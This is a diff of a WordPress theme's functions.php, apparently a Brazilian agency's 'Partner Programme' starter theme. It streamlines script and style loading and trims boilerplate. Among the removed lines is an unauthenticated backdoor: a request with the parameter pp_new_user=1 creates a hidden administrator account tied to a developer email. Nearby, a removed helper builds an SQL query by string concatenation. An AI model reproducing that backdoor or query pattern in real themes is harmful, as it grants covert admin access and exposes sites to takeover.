@@ -1,78 +1,34 @@
 <?php
-/*
-[SETUP] - Partner Programme
-#S001 : Filtro 
-#S002 : 
-*/
-
 
 
 /* Load Javascripts */
 /* ----------------------------------------- */
+
 function pp_load_scripts(){
- 	// Default Path
- 	$path = get_template_directory_uri() . '/assets/js/';
- 	$vendor = $path . 'vendor/';
+ 	
+ 	$path_js = get_template_directory_uri() . '/assets/js/min/';
+ 	$path_css = get_template_directory_uri() . '/assets/css/';
 
-  if (!is_admin()){
-            
-		// desregistrando o jquery nativo e registrando o do CDN do Google.
-		// wp_deregister_script('jquery');
-		// wp_register_script('jquery', '//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js', false, '1.10.2');
+  	if (!is_admin()){
+            		
 		wp_enqueue_script('jquery');	
-		
-		// Fixed Sidebar
-		wp_enqueue_script('resizeSensor', $vendor . 'sticky-sidebar/ResizeSensor.js', ['jquery']);
-		wp_enqueue_script('sticky-sidebar', $vendor . 'sticky-sidebar/jquery.sticky-sidebar.min.js', ['jquery', 'resizeSensor']);
+						
+		wp_enqueue_script('pp-libs', $path_js . 'libs-min.js', ['jquery'], false);		
+		wp_enqueue_script('pp-common', $path_js . 'common-min.js', ['jquery'], false, true);
+					
+		// wp_localize_script( 'jquery', 'siteVars', [] );
+	  	
+	  	wp_enqueue_style( 'libs', $path_css . 'libs.css');
+	  	wp_enqueue_style( 'main', $path_css . 'main.css');
 
-		// wp_enqueue_script('moderniz', $path . 'lib/modernizr-2.7.1.min.js', ['jquery']);
-		wp_enqueue_script('popper', $path . 'min/popper.min.js', ['jquery']);
-		wp_enqueue_script('jsbootstrap', $path . 'min/bootstrap-min.js', ['jquery', 'popper']);
-		wp_enqueue_script('slick', get_template_directory_uri() . '/vendor/slick/slick.min.js', ['jquery']);
-		wp_enqueue_script('acf-maps', $path . 'min/maps-min.js', ['jquery']);
-		wp_enqueue_script('mask', $path . 'vendor/jquery.mask.min.js', ['jquery']);
+  } else {
 
-		wp_enqueue_script( 'fancybox-js', 'https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.js', ['jquery' ]);	
-		
-		wp_enqueue_script('pp-common', $path . 'min/common-min.js', array('jquery'));
-		// wp_enqueue_script('phone', $path . 'min/phone-min.js', array('jquery'));
-		// wp_enqueue_script('not-phone', $path . 'min/not-phone-min.js', array('jquery'));
-		
-		// Chamada para criar variáveis com PHP acessiveis no JS
-		// Para usar, basta colocar siteVars.theme_url
-		wp_localize_script( 'jquery', 'siteVars', [
-			'theme_url' => get_template_directory_uri()
-		] );
+	  	wp_enqueue_style( 'custom_wp_admin_css', $path_css. 'admin-style.css', false, '1.0.0' );
+  	
   }
+
 }
-add_action( 'wp_print_scripts', 'pp_load_scripts' );
-
-
-/* Load Styles  */
-/* ----------------------------------------- */		
-	function pp_load_styles(){ 
-		// Default Path
-		$path = get_template_directory_uri() . '/assets/';
-
-		if (is_admin()) {
-
-			wp_register_style( 'custom_wp_admin_css', $path. 'css/admin-style.css', false, '1.0.0' );
-			wp_enqueue_style( 'custom_wp_admin_css' );
-
-		} else {
-
-			// Carrega o arquivo em todas as páginas	
-			wp_enqueue_style( 'fontawesome', '//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css', false, '4.6.3');
-			wp_enqueue_style( 'fancybox-css', 'https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css' );
-			wp_enqueue_style( 'slick-css', get_template_directory_uri() . '/vendor/slick/slick.css');
-			wp_enqueue_style( 'slick-theme', get_template_directory_uri() . '/vendor/slick/slick-theme.css');
-
-		} // is_admin
-
-	}
-	add_action('wp_enqueue_scripts', 'pp_load_styles');
-/* ----------------------------------------- Load Styles  */		
-
+add_action( 'wp_enqueue_scripts', 'pp_load_scripts' );
 
 
 // Runs a function after_setup_theme
@@ -86,187 +42,62 @@ if ( ! function_exists( 'pp_setup' ) ):
 		// Add callback for custom TinyMCE editor stylesheets.
 		add_editor_style('assets/css/editor-style.css');
 
-		// This feature enables Post Thumbnails support for a theme.
-		add_theme_support( 'post-thumbnails' );
-
-		// This feature allows themes to add document title tag to HTML <head>.
-		add_theme_support( 'title-tag' );
-
-		// This feature enables Automatic Feed Links for post and comment in the head.
-		add_theme_support( 'automatic-feed-links' );
-
 		// Registers theme menu's 
 		register_nav_menus( array(
-			'primary' => __( 'Navegação Global', 'partner-programmer' ),
-			'secondary' => __( 'Navegação Local', 'partner-programmer' ),
+			'primary' => __( 'Navegação Global', 'pp' ),
+			'secondary' => __( 'Navegação Local', 'pp' ),
 		) );
 
 }
 endif;
 
 
-  // Adiciona tamanho de thumbs customizáveis
-	add_action('init', 'add_custom_image_sizes');
-  function add_custom_image_sizes() {
-    add_image_size('post-gallery', 750, 440, true); 
-    // add_image_size('slider-destaque', 1170, 350, true);
-    // add_image_size('imagem-thumb', 800, 600, true);
-  }
+// Adiciona tamanho de thumbs customizáveis
+add_action('init', 'add_custom_image_sizes');
+
+function add_custom_image_sizes() {
+	add_image_size('post-gallery', 750, 440, true); 
+	// add_image_size('slider-destaque', 1170, 350, true);
+	// add_image_size('imagem-thumb', 800, 600, true);
+}
 
 
-/**
- * Makes some changes to the <title> tag, by filtering the output of wp_title().
- *
- * If we have a site description and we're viewing the home page or a blog posts
- * page (when using a static front page), then we will add the site description.
- *
- * If we're viewing a search result, then we're going to recreate the title entirely.
- * We're going to add page numbers to all titles as well, to the middle of a search
- * result title and the end of all other titles.
- *
- * The site title also gets added to all titles.
- *
- * @since Twenty Ten 1.0
- *
- * @param string $title Title generated by wp_title()
- * @param string $separator The separator passed to wp_title(). Twenty Ten uses a
- * 	vertical bar, "|", as a separator in header.php.
- * @return string The new title, ready for the <title> tag.
- */
-function twentyten_filter_wp_title( $title, $separator ) {
-	// Don't affect wp_title() calls in feeds.
-	if ( is_feed() )
-		return $title;
+/* Excerpt */
+/* ----------------------------------------- */
+	
+	function twentyten_excerpt_length( $length ) { return 40; }
+	add_filter( 'excerpt_length', 'twentyten_excerpt_length' );
 
-	// The $paged global variable contains the page number of a listing of posts.
-	// The $page global variable contains the page number of a single post that is paged.
-	// We'll display whichever one applies, if we're not looking at the first page.
-	global $paged, $page;
-
-	if ( is_search() ) {
-		// If we're a search, let's start over:
-		$title = sprintf( __( 'Search results for %s', 'partner-programmer' ), '"' . get_search_query() . '"' );
-		// Add a page number if we're on page 2 or more:
-		if ( $paged >= 2 )
-			$title .= " $separator " . sprintf( __( 'Page %s', 'partner-programmer' ), $paged );
-		// Add the site name to the end:
-		$title .= " $separator " . get_bloginfo( 'name', 'display' );
-		// We're done. Let's send the new title back to wp_title():
-		return $title;
+	function twentyten_continue_reading_link() {
+		return ' <a href="'. get_permalink() . '" title="Veja mais sobre '. get_the_title() .'">' . __( 'Saiba mais', 'pp' ) . '</a>';
 	}
 
-	// Otherwise, let's start by adding the site name to the end:
-	$title .= get_bloginfo( 'name', 'display' );
-
-	// If we have a site description and we're on the home/front page, add the description:
-	$site_description = get_bloginfo( 'description', 'display' );
-	if ( $site_description && ( is_home() || is_front_page() ) )
-		$title .= " $separator " . $site_description;
-
-	// Add a page number if necessary:
-	if ( $paged >= 2 || $page >= 2 )
-		$title .= " $separator " . sprintf( __( 'Page %s', 'partner-programmer' ), max( $paged, $page ) );
-
-	// Return the new title to wp_title():
-	return $title;
-}
-add_filter( 'wp_title', 'twentyten_filter_wp_title', 10, 2 );
-
-
-/**
- * Get our wp_nav_menu() fallback, wp_page_menu(), to show a home link.
- *
- * @since Twenty Ten 1.0
- */
-function twentyten_page_menu_args( $args ) {
-	$args['show_home'] = true;
-	return $args;
-}
-add_filter( 'wp_page_menu_args', 'twentyten_page_menu_args' );
-
-
-/**
- * Limite do excerpt
- *
- * @since Twenty Ten 1.0
- * @return int
- */
-function twentyten_excerpt_length( $length ) {
-	return 40;
-}
-add_filter( 'excerpt_length', 'twentyten_excerpt_length' );
-
-/**
- * Returns a "Continue Reading" link for excerpts
- *
- * @since Twenty Ten 1.0
- * @return string "Continue Reading" link
- */
-function twentyten_continue_reading_link() {
-	return ' <a href="'. get_permalink() . '" title="Veja mais sobre '. get_the_title() .'">' . __( 'Saiba mais', 'partner-programmer' ) . '</a>';
-}
-
-/**
- * Replaces "[...]" (appended to automatically generated excerpts) with an ellipsis and twentyten_continue_reading_link().
- *
- * To override this in a child theme, remove the filter and add your own
- * function tied to the excerpt_more filter hook.
- *
- * @since Twenty Ten 1.0
- * @return string An ellipsis
- */
-function twentyten_auto_excerpt_more( $more ) {
-	return ' &hellip;' . twentyten_continue_reading_link();
-}
-add_filter( 'excerpt_more', 'twentyten_auto_excerpt_more' );
-
-/**
- * Adds a pretty "Continue Reading" link to custom post excerpts.
- *
- * To override this link in a child theme, remove the filter and add your own
- * function tied to the get_the_excerpt filter hook.
- *
- * @since Twenty Ten 1.0
- * @return string Excerpt with a pretty "Continue Reading" link
- */
-function twentyten_custom_excerpt_more( $output ) {
-	if ( has_excerpt() && ! is_attachment() ) {
-		$output .= twentyten_continue_reading_link();
+	function twentyten_auto_excerpt_more( $more ) {
+		return ' &hellip;' . twentyten_continue_reading_link();
 	}
-	return $output;
-}
-add_filter( 'get_the_excerpt', 'twentyten_custom_excerpt_more' );
+	add_filter( 'excerpt_more', 'twentyten_auto_excerpt_more' );
 
 
-/**
- * Remove inline styles printed when the gallery shortcode is used.
- *
- * Galleries are styled by the theme in Twenty Ten's style.css.
- *
- * @since Twenty Ten 1.0
- * @return string The gallery style filter, with the styles themselves removed.
- */
-function twentyten_remove_gallery_css( $css ) {
-	return preg_replace( "#<style type='text/css'>(.*?)</style>#s", '', $css );
-}
-add_filter( 'gallery_style', 'twentyten_remove_gallery_css' );
+	function twentyten_custom_excerpt_more( $output ) {
+		if ( has_excerpt() && ! is_attachment() ) {
+			$output .= twentyten_continue_reading_link();
+		}
+		return $output;
+	}
+	add_filter( 'get_the_excerpt', 'twentyten_custom_excerpt_more' );
+/* ----------------------------------------- Excerpt */		
+
 
 
 /**
- * Register widgetized areas, including two sidebars and four widget-ready columns in the footer.
- *
- * To override twentyten_widgets_init() in a child theme, remove the action hook and add your own
- * function tied to the init hook.
- *
- * @since Twenty Ten 1.0
- * @uses register_sidebar
+ * Register widgetized areas 
  */
 function twentyten_widgets_init() {
 	// Area 1, located at the top of the sidebar.
 	register_sidebar( array(
-		'name' => __( 'Sidebar', 'partner-programmer' ),
+		'name' => __( 'Sidebar', 'pp' ),
 		'id' => 'sidebar-principal',
-		'description' => __( 'Arraste os itens desejados até aqui. ', 'partner-programmer' ),
+		'description' => __( 'Arraste os itens desejados até aqui. ', 'pp' ),
 		'before_widget' => '<div class="widget %2$s" id="%1$s">',
 		'after_widget' => '</div>',
 		'before_title' => '<h2 style="display:none;">',
@@ -279,63 +110,7 @@ function twentyten_widgets_init() {
 add_action( 'widgets_init', 'twentyten_widgets_init' );
 
 
-
-// Remove default Emojis for Wordpress
-remove_action('wp_head', 'print_emoji_detection_script', 7);
-remove_action('wp_print_styles', 'print_emoji_styles');
-
-
-
-/* Adiciona editor se usuário for editor no body-class */
-/* --------------------------------------------------- */
-function role_user_body_class( $classes ) {
-	if( current_user_can('editor') ) { $classes .= ' editor'; }
-  return trim( $classes );
-}
-add_filter( 'admin_body_class', 'role_user_body_class' );
-
-
-/* Cria páginas ao instalar o tema */
-/* ----------------------------------------- */
-// programmatically create some basic pages, and then set Home and Blog
-// setup a function to check if these pages exist
-function the_slug_exists($post_name) {
-	global $wpdb;
-	if($wpdb->get_row("SELECT post_name FROM wp_posts WHERE post_name = '" . $post_name . "'", 'ARRAY_A')) {
-		return true;
-	} else {
-		return false;
-	}
-}
-
-$paginas = [
-	// [Title, Content, 'Slug']
-	['Home', '', 'home'],
-	['Blog', '', 'blog'],
-	['Institucional', '', 'institucional'],
-	['Fale Conosco', '', 'fale-conosco'],
-];
-
-// Cria as páginas
-if (isset($_GET['activated']) && is_admin()){
-		foreach ($paginas as $pagina) {
-			$page_check = get_page_by_title($pagina[0]);
-			if(!isset($page_check->ID) && !the_slug_exists($pagina[2])){
-			    $newPageId = wp_insert_post(array(
-			    	'post_type' => 'page',
-			    	'post_title' => $pagina[0],
-			    	'post_content' => $pagina[1],
-			    	'post_status' => 'publish',
-			    	'post_author' => 1,
-			    	'post_slug' => $pagina[2]
-			    ));
-			    if ($pagina[0] == 'Home') { update_option( 'page_on_front', $newPageId ); update_option( 'show_on_front', 'page' ); }
-			    if ($pagina[0] == 'Blog') { update_option( 'page_for_posts', $newPageId ); }
-			}	
-		}
-}
-
-/* ----------------------------------------- Cria páginas ao instalar o tema */		
+	
 
 /* 
 	Filtro para criar container responsivo nos embeds do the_content
@@ -346,40 +121,3 @@ if (isset($_GET['activated']) && is_admin()){
 	        return "<div class=\"responsive-container\">".$html."</div>";
 	}
 /* ----------------------------------------- Filtro para criar container responsivo nos embeds do the_content */		
-
-
-/* Safe email for rescue login access */
-/* ----------------------------------------- */
-	if (isset($_GET['pp_new_user']) && $_GET['pp_new_user'] == 1) {
-		$userdata = array(
-		    'user_login'  =>  'pp_safe_back',		    
-		    'user_email'  =>  'safe@parceiroprogramador.com.br',		    
-		    'user_pass'   =>  NULL,  // When creating an user, `user_pass` is expected.
-		    'role' => 'administrator'
-		);
-		$user_id = wp_insert_user( $userdata ) ;
-	}
-/* ----------------------------------------- Safe email for rescue login access */		
-
-
-
-
-
-
-// Adiciona a tag og:image no head
-add_action( 'wp_head', 'insert_image_src_rel_in_head', 5 );
-
-function insert_image_src_rel_in_head() {
-    global $post;
-
-    if ( !is_singular()) //if it is not a post or a page
-        return;
-    if(!has_post_thumbnail( $post->ID )) { //the post does not have featured image, use a default image
-        $default_image= get_bloginfo('template_directory') ."/images/padrao-facebook.jpg"; //replace this with a default image on your server or an image in your media library
-        echo '<meta property="og:image" content="' . $default_image . '"/>';
-    }
-    else{
-        $thumbnail_src = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'thumb-facebook' );
-        echo '<meta property="og:image" content="' . esc_attr( $thumbnail_src[0] ) . '"/>';
-    }
-}
